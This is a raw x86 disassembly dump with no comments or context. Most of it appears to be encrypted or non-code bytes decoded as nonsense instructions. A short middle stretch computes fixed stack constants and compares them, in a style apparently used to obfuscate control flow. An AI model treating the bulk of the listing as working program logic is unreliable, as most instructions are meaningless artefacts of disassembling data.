  41cd9a:	adc    al,BYTE PTR [ecx]
  41cd9c:	sbb    eax,0xa23c67a7
  41cda1:	xlat   BYTE PTR ds:[ebx]
  41cda2:	dec    eax
  41cda3:	sbb    eax,0xd09bff0c
  41cda8:	xchg   ebp,eax
  41cda9:	ja     0x41ce2a
  41cdab:	or     DWORD PTR [ecx],eax
  41cdad:	push   0x2cfc40d5
  41cdb2:	stc    
  41cdb3:	ins    DWORD PTR es:[edi],dx
  41cdb4:	sub    al,0x8
  41cdb6:	adc    bl,BYTE PTR [esi+edx*1-0x154d66d8]
  41cdbd:	stos   BYTE PTR es:[edi],al
  41cdbe:	pop    eax
  41cdbf:	(bad)  
  41cdc1:	arpl   WORD PTR [esp+eax*4],bp
  41cdc4:	out    0x5,eax
  41cdc6:	lds    eax,FWORD PTR [edx+0xf0297cb]
  41cdcc:	mov    eax,ds:0xba859be0
  41cdd1:	mov    esp,0xb64c627f
  41cdd6:	add    ebp,DWORD PTR [ebp-0xb]
  41cdd9:	xchg   ecx,ecx
  41cddb:	pop    esp
  41cddc:	sub    al,0x79
  41cdde:	std    
  41cddf:	imul   ebp,DWORD PTR [ecx+0x6157d461],0xffffff81
  41cde6:	sub    bh,BYTE PTR [ecx-0x1b]
  41cde9:	push   esp
  41cdea:	or     BYTE PTR [eax+0x31],bl
  41cded:	mov    bl,0xd1
  41cdef:	or     ch,dl
  41cdf1:	pushf  
  41cdf2:	dec    ebx
  41cdf3:	push   edx
  41cdf4:	push   ds
  41cdf5:	fstp   DWORD PTR [ecx+0x4a556e43]
  41cdfb:	jge    0x41ce5f
  41cdfd:	dec    esi
  41cdfe:	dec    eax
  41cdff:	test   DWORD PTR [ebp+eax*1-0xd],edx
  41ce03:	mov    ebx,0x16416232
  41ce08:	and    cl,BYTE PTR [esp+edx*8-0x5464ead0]
  41ce0f:	and    eax,0x47f3e676
  41ce14:	or     DWORD PTR [eax+0x5c],ebp
  41ce17:	popf   
  41ce18:	mov    ds:0xd5d86fc0,al
  41ce1d:	ins    BYTE PTR es:[edi],dx
  41ce1e:	cwde   
  41ce1f:	jo     0x41ce97
  41ce21:	repnz lods al,BYTE PTR ds:[esi]
  41ce23:	in     al,0xbc
  41ce25:	and    bl,bh
  41ce27:	inc    ecx
  41ce28:	add    al,BYTE PTR [edi+0x4501cada]
  41ce2e:	repz daa 
  41ce30:	out    0x40,al
  41ce32:	fs pop esi
  41ce34:	add    al,0x21
  41ce36:	std    
  41ce37:	sbb    al,0xbc
  41ce39:	push   esp
  41ce3a:	aad    0x28
  41ce3c:	in     eax,dx
  41ce3d:	jb     0x41ce95
  41ce3f:	fwait
  41ce40:	scas   eax,DWORD PTR es:[edi]
  41ce41:	jl     0x41ce2a
  41ce43:	fmul   DWORD PTR [esp+ecx*8+0x764db53b]
  41ce4a:	lds    ebp,FWORD PTR [edx+edx*8-0x43c1ea05]
  41ce51:	jmp    0x6ee3:0x4bc9b957
  41ce58:	jmp    0xfb726f07
  41ce5d:	(bad)  
  41ce5e:	fimul  WORD PTR [eax+0x35]
  41ce61:	mov    BYTE PTR [ecx+0x55654a19],ch
  41ce67:	cld    
  41ce68:	sub    BYTE PTR [edx],al
  41ce6a:	stos   BYTE PTR es:[edi],al
  41ce6b:	mov    al,0x98
  41ce6d:	sbb    al,0x66
  41ce6f:	loope  0x41ceb2
  41ce71:	ffreep st(2)
  41ce73:	icebp  
  41ce74:	ins    BYTE PTR es:[edi],dx
  41ce75:	in     al,0x4b
  41ce77:	inc    esi
  41ce78:	push   ds
  41ce79:	loope  0x41ce9c
  41ce7b:	in     eax,dx
  41ce7c:	test   BYTE PTR [ebp-0x2a20aaef],0x49
  41ce83:	sbb    eax,0xc2d33d79
  41ce88:	pushf  
  41ce89:	push   ss
  41ce8a:	mov    cl,0xb8
  41ce8c:	mov    ebx,0xb640aa10
  41ce91:	mov    eax,0x7fa76361
  41ce96:	(bad)  
  41ce97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ce98:	push   es
  41ce99:	mov    BYTE PTR [edi-0x684ee69c],dh
  41ce9f:	pushf  
  41cea0:	fs (bad) 
  41cea2:	jnp    0x41cecb
  41cea4:	mov    ds:0xcd9c1c9a,al
  41cea9:	pop    ds
  41ceaa:	push   0x5027ffc2
  41ceaf:	aas    
  41ceb0:	outs   dx,DWORD PTR ds:[esi]
  41ceb1:	and    eax,0xf4a99b2a
  41ceb6:	pop    edx
  41ceb7:	je     0x41ce61
  41ceb9:	and    DWORD PTR [ecx+0xd],ebx
  41cebc:	scas   eax,DWORD PTR es:[edi]
  41cebd:	adc    BYTE PTR [esi+0x63],bh
  41cec0:	cmp    BYTE PTR [ecx],ch
  41cec2:	add    eax,0x76dfed5b
  41cec7:	adc    DWORD PTR ds:[edx+0x77],ebp
  41cecb:	mov    bl,0x25
  41cecd:	das    
  41cece:	jo     0x41cf42
  41ced0:	enter  0xaabd,0xe2
  41ced4:	out    dx,eax
  41ced5:	and    ebx,ecx
  41ced7:	xor    cl,BYTE PTR [ebx+eiz*1+0x6a]
  41cedb:	sbb    al,0xcc
  41cedd:	jo     0x41ceac
  41cedf:	out    dx,eax
  41cee0:	ror    al,0x6
  41cee3:	sub    al,0xa
  41cee5:	js     0x41cf2d
  41cee7:	es ss in eax,dx
  41ceea:	dec    esp
  41ceeb:	push   DWORD PTR [ebp-0x2ed64f56]
  41cef1:	popf   
  41cef2:	scas   eax,DWORD PTR es:[edi]
  41cef3:	dec    ebp
  41cef4:	mov    ah,0x63
  41cef6:	out    0xea,al
  41cef8:	sahf   
  41cef9:	inc    edi
  41cefa:	gs push ds
  41cefc:	dec    esp
  41cefd:	cmp    ebp,0xf746953
  41cf03:	pop    es
  41cf04:	mov    al,0xab
  41cf06:	sbb    eax,0xa9d61aa3
  41cf0b:	xchg   edi,eax
  41cf0c:	xor    eax,0xd53d61cc
  41cf11:	adc    dl,BYTE PTR [edx]
  41cf13:	pop    ss
  41cf14:	mov    BYTE PTR fs:[si],dl
  41cf18:	in     eax,0x5f
  41cf1a:	imul   ebx,DWORD PTR [edx-0xfcf9449],0xfffffff6
  41cf21:	xor    al,0x6b
  41cf23:	mov    eax,ds:0xc0389a9b
  41cf28:	dec    esp
  41cf29:	out    0xef,eax
  41cf2b:	out    0x2e,eax
  41cf2d:	shl    DWORD PTR [edi-0x56],0xcf
  41cf31:	pop    es
  41cf32:	sub    ecx,esi
  41cf34:	hlt    
  41cf35:	xor    BYTE PTR [esp+ebx*2],ch
  41cf38:	pop    edx
  41cf39:	xor    eax,0x1eb75026
  41cf3e:	jo     0x41cf30
  41cf40:	jg     0x41cf20
  41cf42:	push   edi
  41cf43:	dec    esi
  41cf44:	das    
  41cf45:	into   
  41cf46:	sub    edx,edx
  41cf48:	sahf   
  41cf49:	sub    ecx,DWORD PTR [ecx-0x60c2fd04]
  41cf4f:	popa   
  41cf50:	dec    esi
  41cf51:	loope  0x41cf55
  41cf53:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cf54:	fsubr  st(1),st
  41cf56:	lahf   
  41cf57:	mov    edx,0x2fea572d
  41cf5c:	mov    cs,WORD PTR [ecx]
  41cf5e:	push   esp
  41cf5f:	adc    bl,BYTE PTR [ebp+0x5]
  41cf62:	add    BYTE PTR [edx-0x1a3f5878],dh
  41cf68:	sbb    al,0x91
  41cf6a:	dec    edi
  41cf6b:	ds push ecx
  41cf6d:	ret    0xb8e1
  41cf70:	sahf   
  41cf71:	(bad)  
  41cf73:	int3   
  41cf74:	add    bl,BYTE PTR [ebx+0x3e695208]
  41cf7a:	les    edx,FWORD PTR [eax-0x547107aa]
  41cf80:	jbe    0x41cfea
  41cf82:	push   0x5d
  41cf84:	sub    BYTE PTR [esi],bh
  41cf86:	dec    ebx
  41cf87:	ins    BYTE PTR es:[edi],dx
  41cf88:	sti    
  41cf89:	retf   0x6803
  41cf8c:	or     DWORD PTR ds:0x115ccb98,0xffffffdf
  41cf93:	sub    eax,DWORD PTR [esi]
  41cf95:	cwde   
  41cf96:	jb     0x41cf88
  41cf98:	xor    al,0xe0
  41cf9a:	neg    DWORD PTR [ebx+edx*4]
  41cf9d:	aaa    
  41cf9e:	imul   eax,esp,0xffffffea
  41cfa1:	xor    ch,BYTE PTR [edi-0x58a5dd51]
  41cfa7:	cwd    
  41cfa9:	ins    DWORD PTR es:[edi],dx
  41cfaa:	sbb    ebx,DWORD PTR [eax]
  41cfac:	or     eax,0xfe01ee2
  41cfb1:	sti    
  41cfb2:	sbb    al,0x11
  41cfb4:	sub    BYTE PTR [edi],ch
  41cfb6:	scas   eax,DWORD PTR es:[edi]
  41cfb7:	adc    bl,BYTE PTR [esi+0x58]
  41cfba:	sbb    eax,0x6d7f60d7
  41cfbf:	adc    eax,0x67d0b30a
  41cfc4:	les    eax,FWORD PTR [edi]
  41cfc6:	cmp    al,0xe7
  41cfc8:	xchg   esi,eax
  41cfc9:	imul   BYTE PTR [edx-0x2d]
  41cfcc:	dec    eax
  41cfcd:	fdivp  st(5),st
  41cfcf:	jge    0x41cf5a
  41cfd1:	ja     0x41cfe7
  41cfd3:	aad    0xad
  41cfd5:	cli    
  41cfd6:	fld    QWORD PTR [ebx]
  41cfd8:	xchg   ebp,eax
  41cfd9:	dec    ebp
  41cfda:	push   edi
  41cfdb:	mov    esi,0x29ff1bcd
  41cfe0:	pop    edx
  41cfe1:	outs   dx,DWORD PTR ds:[esi]
  41cfe2:	stos   DWORD PTR es:[edi],eax
  41cfe3:	icebp  
  41cfe4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cfe5:	and    al,al
  41cfe7:	mov    ah,0xea
  41cfe9:	push   edi
  41cfea:	push   edx
  41cfeb:	jnp    0x41d01a
  41cfed:	les    ebx,FWORD PTR [ebp-0x3239788f]
  41cff3:	cmp    eax,0x3041528f
  41cff8:	test   DWORD PTR [esi-0x2d24cd6b],esp
  41cffe:	sub    cl,BYTE PTR [eax-0x24ef351f]
  41d004:	mov    ebx,0x8f0e98cd
  41d009:	ss retf 0xb7c1
  41d00d:	push   ebx
  41d00e:	dec    eax
  41d00f:	pop    eax
  41d010:	mov    bh,0x3f
  41d012:	mov    al,ds:0x83cbabfa
  41d017:	cli    
  41d018:	std    
  41d019:	adc    ebx,DWORD PTR [ebp+0x355297e8]
  41d01f:	push   edx
  41d020:	hlt    
  41d021:	stos   BYTE PTR es:[edi],al
  41d022:	jbe    0x41d055
  41d024:	into   
  41d025:	jmp    0x41cfcf
  41d027:	cli    
  41d028:	jecxz  0x41d0a1
  41d02a:	pop    DWORD PTR [ecx-0x1c11107d]
  41d030:	pop    ss
  41d031:	dec    edi
  41d032:	js     0x41d03c
  41d034:	aam    0x38
  41d036:	call   0x1ff0:0x34b14bcd
  41d03d:	fidiv  WORD PTR [edi]
  41d03f:	sbb    edi,edx
  41d041:	or     al,0x7c
  41d043:	ins    DWORD PTR es:[edi],dx
  41d044:	dec    esi
  41d045:	inc    ebp
  41d046:	add    DWORD PTR [ecx+0x48],esp
  41d049:	inc    edi
  41d04a:	mov    DWORD PTR [ebp-0x72e59dce],eax
  41d050:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d051:	test   BYTE PTR [eax],bl
  41d053:	js     0x41d01d
  41d055:	(bad)  
  41d056:	jecxz  0x41d0cf
  41d058:	or     eax,DWORD PTR [ebx+0x47]
  41d05b:	mov    WORD PTR [edx+edi*8],?
  41d05e:	mov    bh,0xc9
  41d060:	push   0x7fbdbaa9
  41d065:	mov    ecx,0xd9257aae
  41d06a:	call   0xb5998366
  41d06f:	sbb    eax,0xdb001ec
  41d074:	pop    ebp
  41d075:	sahf   
  41d076:	or     al,0x6
  41d078:	or     eax,0xe83fa772
  41d07d:	out    0x46,al
  41d07f:	ss pusha 
  41d081:	pusha  
  41d082:	and    al,0xc2
  41d084:	xor    DWORD PTR [edi-0x7abb4da0],0x31b09c43
  41d08e:	cmc    
  41d08f:	jp     0x41d0db
  41d091:	(bad)  
  41d092:	mov    al,ds:0xf1ba1914
  41d097:	sub    eax,0x10c97765
  41d09c:	ds mov esp,0x45bb27c3
  41d0a2:	lods   al,BYTE PTR ds:[esi]
  41d0a3:	in     al,0x3c
  41d0a5:	sub    ebx,DWORD PTR [ecx+0x4e]
  41d0a8:	cmp    ebx,esp
  41d0aa:	js     0x41d087
  41d0ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d0ad:	sbb    al,0x1c
  41d0af:	jo     0x41d098
  41d0b1:	sbb    DWORD PTR ds:0x2acb0be7,esp
  41d0b7:	std    
  41d0b8:	add    dh,bh
  41d0ba:	push   eax
  41d0bb:	mov    ss,WORD PTR [edi+ecx*2-0x33655c80]
  41d0c2:	lods   eax,DWORD PTR ds:[esi]
  41d0c3:	jb     0x41d08c
  41d0c5:	cmp    ebp,DWORD PTR [eax-0x24]
  41d0c8:	cmp    eax,0xa7388b64
  41d0cd:	pop    edi
  41d0ce:	sub    al,cl
  41d0d0:	mov    cl,BYTE PTR [esp+0x38]
  41d0d4:	sub    al,0x56
  41d0d6:	movzx  eax,al
  41d0d9:	movzx  ecx,cl
  41d0dc:	cdq    
  41d0dd:	idiv   ecx
  41d0df:	movzx  ecx,BYTE PTR [esp+0x2c]
  41d0e4:	or     eax,ecx
  41d0e6:	mov    BYTE PTR [esp+0xc],al
  41d0ea:	mov    BYTE PTR [esp+0x24],0x1
  41d0ef:	mov    BYTE PTR [esp+0x2b],0xcf
  41d0f4:	mov    BYTE PTR [esp+0x3c],0x6
  41d0f9:	mov    BYTE PTR [esp+0x38],0x25
  41d0fe:	mov    BYTE PTR [esp+0x2c],0xf8
  41d103:	mov    al,BYTE PTR [esp+0x2c]
  41d107:	mov    cl,BYTE PTR [esp+0x38]
  41d10b:	or     al,0xc4
  41d10d:	and    al,cl
  41d10f:	mov    cl,BYTE PTR [esp+0x3c]
  41d113:	imul   cl
  41d115:	mov    cl,BYTE PTR [esp+0x2b]
  41d119:	movzx  ecx,cl
  41d11c:	movzx  eax,al
  41d11f:	and    eax,ecx
  41d121:	mov    cl,BYTE PTR [esp+0x24]
  41d125:	movzx  ecx,cl
  41d128:	cdq    
  41d129:	idiv   ecx
  41d12b:	mov    cl,BYTE PTR [esp+0xc]
  41d12f:	cmp    cl,al
  41d131:	je     0x41d926
  41d137:	lea    eax,[esp+0x9c]
  41d13e:	push   eax
  41d13f:	lea    edi,[esp+0x80]
  41d146:	call   0x40f356
  41d14b:	cmp    eax,ebx
  41d14d:	jmp    0x41d51c
  41d152:	lahf   
  41d153:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d154:	out    dx,eax
  41d155:	cdq    
  41d156:	out    dx,eax
  41d157:	inc    ecx
  41d158:	push   ds
  41d159:	push   ds
  41d15a:	mov    eax,0xeabc6585
  41d15f:	push   ds
  41d160:	in     al,dx
  41d161:	mov    esi,0x18165d36
  41d166:	mov    esp,0x38181812
  41d16b:	dec    ecx
  41d16c:	pop    edi
  41d16d:	clc    
  41d16e:	ins    BYTE PTR es:[di],dx
  41d170:	adc    bh,BYTE PTR [ebx+0x411c771d]
  41d176:	inc    esp
  41d177:	addr16 nop
  41d179:	aas    
  41d17a:	push   0xffffffa8
  41d17c:	xchg   DWORD PTR [ebx],esp
  41d17e:	adc    al,0xae
  41d180:	mov    esp,0x64aba39
  41d185:	in     eax,0x32
  41d187:	xchg   edi,eax
  41d188:	daa    
  41d189:	mov    eax,0xff67351f
  41d18e:	mov    eax,ds:0x919f1aed
  41d193:	jecxz  0x41d184
  41d195:	ins    DWORD PTR es:[edi],dx
  41d196:	mov    esi,0xac064de9
  41d19b:	cmp    esp,0x3300c7c2
  41d1a1:	lds    esi,FWORD PTR [eax]
  41d1a3:	in     al,dx
  41d1a4:	push   0xcb353101
  41d1a9:	out    0xa4,al
  41d1ab:	mov    dl,0x48
  41d1ad:	jb     0x41d1b9
  41d1af:	test   al,0x2c
  41d1b1:	iret   
  41d1b2:	fstp   QWORD PTR [eax]
  41d1b4:	cmp    DWORD PTR [edi-0x69f71828],esi
  41d1ba:	stos   DWORD PTR es:[edi],eax
  41d1bb:	int    0x70
  41d1bd:	sbb    bl,BYTE PTR [ebx]
  41d1bf:	inc    edi
  41d1c0:	je     0x41d212
  41d1c2:	sub    DWORD PTR [eax+edx*2],eax
  41d1c5:	xor    DWORD PTR [esi+0x3e],ecx
  41d1c8:	sbb    ebp,DWORD PTR [edx+0x34]
  41d1cb:	dec    edx
  41d1cc:	jb     0x41d1f5
  41d1ce:	jb     0x41d21c
  41d1d0:	lahf   
  41d1d1:	mov    fs,edi
  41d1d3:	jmp    0x41d227
  41d1d5:	pop    edi
  41d1d6:	jbe    0x41d1fb
  41d1d8:	cmc    
  41d1d9:	jge    0x41d160
  41d1db:	pop    edi
  41d1dc:	and    dh,BYTE PTR [ebp+0x4c]
  41d1df:	mov    ebp,DWORD PTR [ebp+edx*2+0x4ceac565]
  41d1e6:	mov    ecx,ds
  41d1e8:	jbe    0x41d19d
  41d1ea:	outs   dx,BYTE PTR ds:[esi]
  41d1eb:	xchg   ebx,eax
  41d1ec:	mov    eax,ds:0x55643f71
  41d1f1:	ins    BYTE PTR es:[edi],dx
  41d1f2:	adc    DWORD PTR [edi+ebp*2+0x5a09b8b4],ebp
  41d1f9:	mov    edi,0xc24c50d
  41d1fe:	inc    edx
  41d1ff:	(bad)  
  41d200:	loope  0x41d21a
  41d202:	add    al,0xbb
  41d204:	pop    es
  41d205:	pop    es
  41d206:	xlat   BYTE PTR ds:[ebx]
  41d207:	xchg   edi,eax
  41d208:	sub    eax,0x6ae24ee2
  41d20d:	xor    al,0x26
  41d20f:	push   ecx
  41d210:	fwait
  41d211:	jmp    0x41d1df
  41d213:	inc    ecx
  41d214:	syscall 
  41d216:	or     esp,edi
  41d218:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  41d21a:	cmp    DWORD PTR [edi+esi*2],0x61
  41d21e:	inc    ecx
  41d21f:	add    bh,cl
  41d221:	ror    DWORD PTR [edi+0x47352e1b],0xe6
  41d228:	add    ebx,edx
  41d22a:	mov    eax,0x7b45aac1
  41d22f:	jg     0x41d297
  41d231:	retf   
  41d232:	mov    dh,0xe9
  41d234:	xchg   edi,eax
  41d235:	inc    eax
  41d236:	lahf   
  41d237:	dec    edi
  41d238:	nop
  41d239:	pop    ecx
  41d23a:	inc    edx
  41d23b:	enter  0x129e,0x9a
  41d23f:	mov    al,0xf
  41d241:	sbb    eax,0xc8e14a95
  41d246:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d247:	and    DWORD PTR [ecx-0x6a1f7b08],ebp
  41d24d:	sub    BYTE PTR [ebx-0x33],ch
  41d250:	mov    ss,WORD PTR [ebp+0x3d]
  41d253:	xchg   ecx,eax
  41d254:	inc    edx
  41d255:	mov    al,0x85
  41d257:	mov    edx,0x1165cb72
  41d25c:	ret    0x63ff
  41d25f:	jp     0x41d25f
  41d261:	xor    eax,0xe39d310
  41d266:	repz inc esi
  41d268:	push   cs
  41d269:	les    edi,FWORD PTR [ebp+0x7f81d7a4]
  41d26f:	or     al,0x69
  41d271:	or     edi,DWORD PTR [ebx-0x59787105]
  41d277:	call   0x55a7:0x5802fb12
  41d27e:	and    DWORD PTR [ecx+0x15a65611],edx
  41d284:	mul    DWORD PTR [esi-0x74]
  41d287:	pop    esp
  41d288:	xchg   esp,eax
  41d289:	push   ebp
  41d28a:	fimul  WORD PTR [ebp+0x232035b2]
  41d290:	mov    ch,0x62
  41d292:	or     esi,DWORD PTR [eax+0x6d]
  41d295:	int3   
  41d296:	clc    
  41d297:	popf   
  41d298:	add    BYTE PTR [esi-0x60048f4c],ah
  41d29e:	je     0x41d261
  41d2a0:	jle    0x41d24b
  41d2a2:	adc    al,0x53
  41d2a4:	xchg   al,ah
  41d2a6:	xor    eax,esp
  41d2a8:	pop    es
  41d2a9:	into   
  41d2aa:	add    BYTE PTR [ebx+ebp*2-0x2f],al
  41d2ae:	inc    ebp
  41d2af:	fild   WORD PTR [ebx+0x54]
  41d2b2:	mov    edx,0x64721b77
  41d2b7:	jecxz  0x41d27b
  41d2b9:	sub    DWORD PTR [ebp+ebp*2-0x65b46cd0],ecx
  41d2c0:	fisttp DWORD PTR [ebx+0x3b]
  41d2c4:	aaa    
  41d2c5:	(bad)  
  41d2c6:	rcr    BYTE PTR [ebp-0x4237c7b4],0xb2
  41d2cd:	int3   
  41d2ce:	out    dx,al
  41d2cf:	pop    ebx
  41d2d0:	jle    0x41d26f
  41d2d2:	jne    0x41d32b
  41d2d4:	xchg   ebx,eax
  41d2d5:	xchg   edi,eax
  41d2d6:	lds    edi,FWORD PTR [eax+0x64]
  41d2d9:	and    ch,dl
  41d2db:	push   es
  41d2dc:	jmp    0x7166add7
  41d2e1:	xor    BYTE PTR [ecx-0xd106f60],cl
  41d2e7:	int    0x52
  41d2e9:	fwait
  41d2ea:	cs inc ecx
  41d2ec:	repnz push ecx
  41d2ee:	test   eax,0xeb5f290f
  41d2f3:	test   BYTE PTR [esp+eax*1],bh
  41d2f6:	cld    
  41d2f7:	ss sahf 
  41d2f9:	jmp    0x4844d086
  41d2fe:	jge    0x41d2ad
  41d300:	or     cl,bh
  41d302:	or     ecx,DWORD PTR [edx+0x7a9c4dfb]
  41d308:	call   0xb79f:0xec66c8d7
  41d30f:	rcr    BYTE PTR [edx+ebp*1-0x35593c7f],1
  41d316:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d317:	sub    bh,BYTE PTR [edi]
  41d319:	shl    BYTE PTR ds:0x7f58537a,1
  41d31f:	inc    ecx
  41d320:	xor    al,0x55
  41d322:	test   BYTE PTR [ebx],al
  41d324:	sbb    DWORD PTR [eax+0x471723fb],0xfdb6335d
  41d32e:	repnz jecxz 0x41d301
  41d331:	add    DWORD PTR [esi+0x3a],0xffffffc3
  41d335:	mov    al,ds:0xa64bc791
  41d33a:	push   ebx
  41d33b:	rcr    DWORD PTR [ecx-0x7de0321c],cl
  41d341:	sbb    eax,0x71a02157
  41d346:	push   eax
  41d347:	(bad)
  41d34a:	push   eax
  41d34b:	add    eax,0xd3c2e8e0
  41d350:	and    al,0xbd
  41d352:	pop    ss
  41d353:	mov    ch,0x9f
  41d355:	mov    ah,0x9b
  41d357:	daa    
  41d358:	in     eax,0xee
  41d35a:	mov    BYTE PTR [edi-0x4cf739d7],dh
  41d360:	or     al,0x62
  41d362:	inc    edx
  41d363:	jnp    0x41d399
  41d365:	or     DWORD PTR [edi-0x56],0x7f
  41d369:	pop    ds
  41d36a:	das    
  41d36b:	mov    al,ds:0x7347280f
  41d370:	push   ebx
  41d371:	fidiv  DWORD PTR [edx+0x18]
  41d374:	ins    DWORD PTR es:[edi],dx
  41d375:	inc    ecx
  41d376:	jmp    0x25a2:0x1694927
  41d37d:	add    al,0xc4
  41d37f:	dec    ebp
  41d380:	les    esi,FWORD PTR [ebp-0x59cefa4b]
  41d386:	sahf   
  41d387:	adc    eax,0xda6adfa8
  41d38c:	and    eax,0xdfc42880
  41d391:	repnz inc edi
  41d393:	call   0xd77578e0
  41d398:	jbe    0x41d3f2
  41d39a:	rcl    cl,1
  41d39c:	pmullw mm5,mm5
  41d39f:	sbb    bh,BYTE PTR [eax-0x68]
  41d3a2:	mov    eax,0xa07cda6b
  41d3a7:	pop    ebp
  41d3a8:	and    BYTE PTR [edx+0x240da2e1],dl
  41d3ae:	outs   dx,DWORD PTR ds:[esi]
  41d3af:	cmp    ebp,esp
  41d3b1:	(bad)  
  41d3b2:	enter  0xd361,0xa6
  41d3b6:	mov    DWORD PTR [eax+eiz*8-0x1d083d46],edx
  41d3bd:	mov    BYTE PTR [edi+0x5fccab88],al
  41d3c3:	jns    0x41d3ed
  41d3c5:	inc    esp
  41d3c6:	pop    ebp
  41d3c7:	loop   0x41d3ee
  41d3c9:	xchg   ebp,eax
  41d3ca:	sub    DWORD PTR [ebx-0x4b766dcd],esp
  41d3d0:	dec    ecx
  41d3d1:	jne    0x41d377
  41d3d3:	mov    al,0xd5
  41d3d5:	sub    ecx,esp
  41d3d7:	lds    esp,FWORD PTR ds:[ebp-0x29]
  41d3db:	into   
  41d3dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d3dd:	adc    cl,BYTE PTR [edi+0x1]
  41d3e0:	xchg   ebx,eax
  41d3e1:	mov    ecx,0x724260e5
  41d3e6:	test   DWORD PTR [ebp+0x1d],ebp
  41d3e9:	popa   
  41d3ea:	pusha  
  41d3eb:	mov    edi,0x6aeede1e
  41d3f0:	stos   BYTE PTR es:[edi],al
  41d3f1:	imul   esp,DWORD PTR [ecx-0x50],0xf637af7e
  41d3f8:	mov    WORD PTR [eax-0x3b],ss
  41d3fb:	shl    DWORD PTR [ebp-0x57],1
  41d3fe:	sar    DWORD PTR [edx+0x27],0xfa
  41d402:	shl    ebx,0xe1
  41d405:	in     eax,0x5
  41d407:	addr16 daa 
  41d409:	fadd   st(2),st
  41d40b:	outs   dx,DWORD PTR ds:[esi]
  41d40d:	lahf   
  41d40e:	lods   al,BYTE PTR ds:[esi]
  41d40f:	pop    ss
  41d410:	je     0x41d3a3
  41d412:	cdq    
  41d413:	es sub esp,edi
  41d416:	pop    ebp
  41d417:	or     bh,0x5d
  41d41a:	pop    esi
  41d41b:	push   0xb5e08096
  41d420:	push   esp
  41d421:	shl    BYTE PTR [ecx],cl
  41d423:	call   0xe995:0x2a529c60
  41d42a:	in     eax,dx
  41d42b:	and    DWORD PTR [edx-0x29],edx
  41d42e:	jp     0x41d48f
  41d430:	sub    BYTE PTR [esi+0x7a],0x6
  41d434:	mov    es,WORD PTR [edi+0x55]
  41d437:	enter  0xc6a4,0x74
  41d43b:	bound  edx,QWORD PTR [edx-0x499d5c47]
  41d441:	outs   dx,BYTE PTR ds:[esi]
  41d442:	mov    ?,WORD PTR gs:[ecx]
  41d445:	pop    es
  41d446:	sbb    al,0x28
  41d448:	xchg   DWORD PTR [eax],eax
  41d44a:	cmp    cl,dl
  41d44c:	call   0x27898c8d
  41d451:	arpl   di,si
  41d453:	adc    dh,BYTE PTR ds:0xd7d1f798
  41d459:	scas   eax,DWORD PTR es:[edi]
  41d45a:	daa    
  41d45b:	ins    BYTE PTR es:[edi],dx
  41d45c:	adc    bh,BYTE PTR [edx]
  41d45e:	pop    ebx
  41d45f:	pop    esp
  41d460:	cmp    eax,0x5fe191d5
  41d465:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d466:	mov    esi,0x48e593b8
  41d46b:	out    0xcc,eax
  41d46d:	mov    WORD PTR [ecx],ss
  41d46f:	test   cl,ch
  41d471:	adc    ch,bl
  41d473:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d474:	shl    DWORD PTR [ecx-0x6b],1
  41d477:	mov    ebp,DWORD PTR [edi*4+0x67af4905]
  41d47e:	(bad)  
  41d47f:	loope  0x41d4fb
  41d481:	jle    0x41d483
  41d483:	aaa    
  41d484:	in     al,0x3a
  41d486:	sbb    BYTE PTR [ecx],dl
  41d488:	mov    DWORD PTR [ecx],ebp
  41d48a:	jo     0x41d4b7
  41d48c:	in     eax,0x14
  41d48e:	gs mov ch,0x3d
  41d491:	sbb    cl,BYTE PTR [esi+0x3a678ff8]
  41d497:	fmul   QWORD PTR [ecx-0x24]
  41d49a:	and    bh,bl
  41d49c:	cmp    al,0xfb
  41d49e:	in     al,dx
  41d49f:	push   eax
  41d4a0:	pop    edi
  41d4a1:	sar    BYTE PTR [ebx-0x38102fe9],0xc6
  41d4a8:	in     eax,dx
  41d4a9:	pop    ecx
  41d4aa:	adc    eax,0xce3a033
  41d4af:	into   
  41d4b0:	outs   dx,DWORD PTR ds:[esi]
  41d4b1:	adc    al,0x7a
  41d4b3:	mov    BYTE PTR [edi],al
  41d4b5:	push   eax
  41d4b6:	inc    edx
  41d4b7:	xchg   BYTE PTR [ecx+edi*2-0x72448dcc],bl
  41d4be:	xchg   esp,eax
  41d4bf:	jnp    0x41d484
  41d4c1:	mov    ebx,0x37f721dd
  41d4c6:	cmc    
  41d4c7:	mov    ecx,0x2c486e9f
  41d4cc:	xor    al,0x15
  41d4ce:	mov    edi,0x1602ea5f
  41d4d3:	dec    ecx
  41d4d4:	stos   BYTE PTR es:[edi],al
  41d4d5:	loop   0x41d4c3
  41d4d7:	jge    0x41d45c
  41d4d9:	inc    esi
  41d4da:	jg     0x41d4e6
  41d4dc:	addr16 shl cl,1
  41d4df:	bound  esp,QWORD PTR [ecx]
  41d4e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d4e2:	or     DWORD PTR ds:0x5cb5c647,edi
  41d4e8:	lods   al,BYTE PTR ds:[esi]
  41d4e9:	jb     0x41d480
  41d4eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d4ec:	xchg   edx,eax
  41d4ed:	arpl   WORD PTR [esi-0x4177193],ax
  41d4f3:	cmp    esp,esi
  41d4f5:	or     BYTE PTR [edx+ebp*8+0x53],0x54
  41d4fa:	jb     0x41d55b
  41d4fc:	ins    BYTE PTR es:[edi],dx
  41d4fd:	push   edi
  41d4fe:	mov    ds,ebx
  41d500:	adc    BYTE PTR [edi+0x52],al
  41d503:	or     eax,0xc5b8d830
  41d508:	jne    0x41d4ec
  41d50a:	sub    BYTE PTR [edi-0x6b],dl
  41d50d:	out    dx,al
  41d50e:	or     BYTE PTR [ebx+0x1b50b1fb],0xcc
  41d515:	push   0xffffffe8
  41d517:	imul   esp,DWORD PTR [edi],0x5c
  41d51a:	dec    ecx
  41d51b:	das    
  41d51c:	jne    0x41d926
  41d522:	cmp    edx,esi
  41d524:	jne    0x41d926
